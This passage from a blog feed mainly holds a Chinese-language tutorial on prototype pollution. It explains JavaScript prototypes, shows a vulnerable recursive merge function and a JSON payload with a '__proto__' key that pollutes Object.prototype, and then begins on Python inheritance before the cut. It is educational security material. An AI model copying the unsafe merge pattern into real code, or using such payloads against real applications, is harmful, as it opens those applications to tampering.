4e56ec5d93fce90386710bbfdd641ad7d1d767b1c8ff4c7d624cd5168b165f157f1b2b61e921b7abc389211fc21dd3f6ae1e705c243a7873a37458d7425777c4fbf031a9f83dc4074cb309167d4b6557a4641280ac16c919f83ec67e9b7675c109ee5945186cb6a534146c219389706826182de311a8b1fd7348ed7837129e58a409daf6689d24fa8ee0c05b26795bc27ded63b4dfb89a0fba036e4e8edac65a1947c6ef8ddcf3d3a83382a651167e510dd8d5a750dd3470a8c19b97d872771e760ce528156419b3aa87db8722b54be5309fa92c91af66b556f570d5027015e804b3c87d46412822afca2f4389588875710b728c31626f0e770fcd3f88729eebb85b86882d00830e137559812002f9a89a4d62f4a2d083dba32b0e9220c7c8323b058821118f40f1a1f18636fcd32afe3951ff83f6b81210309c5e9fb71c78cfd5b25b1813c13b1dd823b11a180c8dcb532bb0781858575d7bf0d69d5a9498b05ccfe3ce50929c29e06292df5c66a24367fa256e33ce18a27059aa55c5dfe62c86c4cec0a5668ea230020d8b965db2b7fc79237426ecd7ff87c74cc5eec36021049a381d731ae984a0006670d3715488986d777a7f79daa580f604045a209a263e4dfc3ce09d72632d5d62b09f114d639d52e3ea2a8cc843d9514646883826903f223013b82834b86a3ff7c52e399b5a7fe6ef6c4557a1a7ce98c3ba6fc23312084bb43fcaa99a978703587eadbd8fa4ccbedf3c44d62e14ac493dfc6131537e8ce71f8de14d79244c58373f8533b6d78a6e842ac4f95874e93ce08d3a6fd12a368a12010f3ac402dcaf069dcb266428aa32175b64259d17df06ff6b663b3e0017cd21e3216544950b536e218777c71b0e0c5398804abd4f7ff876bd5248dde476944b97992007104be8e6894072337d59d1059560e131b1a5638259276ce76396c5d2dc923dc8bb2711482d0a4b1b5c4fb55420c434701b7eab40bc3dc041bbb86ddc7243033f36f54c304acccb5c2bcfac60ec7e68662a779b38a17f97630d094fd118a199323d353718159c39e1b11850a24985f93184381f085b4d5d011b99b2f7c35b542542f90caa752ca2b919bf247eccc05c2dd82e483aaa6750e1d68f168b8bdae23a9090d2e2a93aa3c1a5a8ecfd0281d88da796f9d57c22d90c4a02d7626758c644b31b07ac9ed77ed21d273a3132a96408074ae382662b96634d46f4846106a87619f1e9dfc2612b0384fd066425c834c5c51b10eadc6a616030d75715e723e86e599abffc7e4c3407cda231445277bef1f54f944591cdbb3a34c6e745598ed976f3bc06881b9abf5e445b953e436da52c01479e8409469d45374f953b0c7384512e3b062104d878f98edb1c7be7934d3cdbb2921e9fc4d7d683815b61e74f20502a244d52f87ea5481de3a5c54308a54ab92f5b55f35ee72ded80791712fb355b2c67f29cbf5d409418e3251e5d7865ce89a8c66de865331b3e656dd66c86d6622e5a1535d1d74fe71f5e721921ecb2c872f3a46c116bb0811c1b6f251a70db78cf6069360e5d09d3c112bd55a25d80d6df69f5bc5450ba33984c340a5cdb7e22ce18d25763c428923d1f857a538182be5864fdc145f4fd8ad3b38f1e001f32c28ae33bf6b6204ce14b61bc4297655fe170a1584bbcb7fefd78dd31c09c9ce25d2152a48a70a9023c40caab59aa674c0b8335b0fc2ad8a2de8d3b91470a9353881fb329544aafd81967e249c1306ad79489ace88088b2e6e1c5b82f176503e9a7de670ebad906f454aba9eb476466f07a39f0f4949c6fcd1c94867995842861140346e92ce938f09a1d602e0ec613f510a0787c83b866467a4002a8e8e9aa6f655996bf67363f42b454bebc5631bcda375bfa7cdcd5aaac8801efa70000f8eae87b63d7909b76da72f8f77d488fcd690bc40501eb56d700fbdaa740b0c54bfeb5dc911f58b3242aa41127c8c4b36163827ea7b75d8b527f9fbe1f0853d6f6159ac86a410ca38815855b0e01b421f0c5d452d3e202d3c70c7f335d4bae6120301b628c8ddd847c5a77f2735ec05cee54141ff3fedcfee63f9fbc42f8958330a3161e4ea47f472cbee46701cc4837b72a0bf315905579af67388834737e29cfad61330881cc6bf500de0744191c3672569b9c65ddf669907979b8448e579e97035dbb9d4e681c5c4865ef5d389f3ee073beda9edc231a56b9e10590df0ba29cb5d4edddf8b66f85a96441f90705d0b62591f124997524ade0b0a46b0ebc111e792df944e3768edf20224a922bf8d609e656cc3cee8f96b112f2b218a2aecc089b2b8628bdd6589ab4e4f39e8165ab83576651c8d9754689c11ba6f9ce198c8b029d0bf7bfc06ff4a2af41535d8201e96821b300d3ed47b6c4314ebcc4fc921fd04da60bf413a43e859477675b3cc05eefd4b08ca759973116b3cd62f83c45fdbeafaa0efee3a3dbaa513adc3aea26d3d4d2ee21bd822bbf56d01748eb70c60fe12e479ab83a9ae407a6374be9656a905961380617108ab5dfc62a88f9afc46f6fd818d34c5f10fc7daa720517a48092e49de6cb387f03456a3dd94474d075f1c8c7bc532fb53753a11280e65b0a523390ea46b257efdee1e48db30a65b40c92a978d54c20411c4576bbb20cc4b109c9616275b0c1da2c05b8e201c2ec22458ca52512d5f5f21075c7576f4f7018f5d41126660093606f43569fed82c58761fa01a3c5336b90a7d09272a46040fc316c225c23c42beec5c0dac2229f139adfd319cf99d4a951df1f02d9a700afa9841e33982d29307b7d25c7641868387bc16681132551ccf7618860790d080ae1d316a6fda92f1087992b1b26aaf0b93ed7f59a3b72ef0fd42220382ffb3e0f6c15220887f3286a4246cc245ef204b31fc449139b087edefeb4f737565f1db28204f37a2c880a054389c453a1172b36c44f5a11fac0ce81b82ea771bbf9f7e617b4b3cfd419ba0a3af6a9087509d4846cca26811883171f8efb5861a715770c9ab939aea84bed6b1ac4e5d2be51dee61e01cbb9a6bfa2d84fc4e4aa5ba8fc96fd30c86950f4e0f2337a9a8c58a0daa9cf6a3dce8e0d23d8488599b478df5e98727e2397e26013d9f643ef6382760182da79975a13b9c1b7ce87a3001593954b770ef67eddcfd0f7a093325f3d5c9373cfd75af4e5cc6241ee2575db14140153e7f2b559f59fa862ec876214defb92a935f635b576b053b1864525543a94bafc5de307721550e250ce48efc3ac44a82d8b628350890bc685b260936958a9658c9d7bd6349545763efab748e34af590f1ff813fa810ff417dd9cb7ae06b1ba07cbb80150f92d3fa242a8c941c543318a5e1a3a546598c5ccd8c7a6f0f98d614c30b11d15f3d44bcf7e9e5e127335b8e43565d59aa487854c432ad45ecaca5d310aa4d558acdc2e24a5d2b0f61de3db66be78d284e7f4d1fde14ef94e9bddd6e667a988bc6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>春秋云镜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原型链污染</title>
    <link href="/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2025/03/09/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>最近复现知识点时发现，原型链污染这一块的原来还不是很清楚，平时都是那工具搜哈的，现在有时间捡起来重新学习一下</p><h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="prototype和-proto-分别是什么"><a href="#prototype和-proto-分别是什么" class="headerlink" title="prototype和__proto__分别是什么"></a><code>prototype</code>和<code>__proto__</code>分别是什么</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br></code></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>    &#125;<br>&#125;<br><br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()).<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)<br>&#125;<br><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br>foo.<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">foo.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span><br></code></pre></td></tr></table></figure><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)<br></code></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code><br><img src="C:/Users/xp/AppData/Roaming/Typora/typora-user-images/image-20250311224928865.png" alt="image-20250311224928865"></li></ol><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br></code></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225454881.png" alt="image-20250311225454881"></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225904998.png" alt="image-20250311225904998"></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o1.a, o1.b)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">o3</span> = &#123;&#125;</span><br><span class="hljs-function"><span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(o3.b)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311225953552.png" alt="image-20250311225953552"></p><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p><p>当然<code>clone</code>同样存在该问题，后续研究</p><h1 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h1><p>在python中，万物即对象，每个对象都有一个指向类的引用，类还有自己的属性和方法，在实例查找属性或方法时的调用顺序时</p><p><code>实例字典 → 类字典 → 父类字典 … → object(基类)</code>MRO的解析顺序,但是与js不同的是，python没有<code>proto</code>这样的原型链，继承关系完全</p><p>由类层次结构决定</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>引用一位师傅的方法</p><ul><li><p>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</p></li><li><p>可以自由地给一个实例变量绑定属性，像js</p></li><li><p>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</p></li><li><p>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</p></li><li><p>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</p></li><li><p>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</p></li></ul><h2 id="python的继承"><a href="#python的继承" class="headerlink" title="python的继承"></a>python的继承</h2><h3 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h3><p>通super()调用父类方法，没必要重复写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Subclass must implement this abstract method&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, breed</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.breed = breed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, color</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.color = color<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().speak()  <span class="hljs-comment"># 调用父类的 speak 方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Meow!&quot;</span>)<br><br><br>instance = Cat(<span class="hljs-string">&quot;猫&quot;</span>, <span class="hljs-string">&quot;black&quot;</span>)<br><span class="hljs-built_in">print</span>(instance.name)<br><span class="hljs-built_in">print</span>(instance.__class__.__mro__)<br><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">猫<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Cat&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.Animal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>单继承的调用链</p><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><p>加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Flyer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fly</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> is flying.&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span>(Animal, Flyer):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        <span class="hljs-variable language_">self</span>.species = species<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> chirps.&quot;</span>)<br><br>a=Bird(<span class="hljs-string">&quot;Bob&quot;</span>,<span class="hljs-string">&quot;Male&quot;</span>)<br><span class="hljs-built_in">print</span>(a.__class__.__mro__)<br></code></pre></td></tr></table></figure><p>可以看见</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-name">&lt;class</span> &#x27;__main__.Bird&#x27;&gt;, &lt;class &#x27;__main__.Animal&#x27;&gt;, &lt;class &#x27;__main__.Flyer&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br></code></pre></td></tr></table></figure><p>标准的MRO调用顺序</p><h3 id="污染过程解析"><a href="#污染过程解析" class="headerlink" 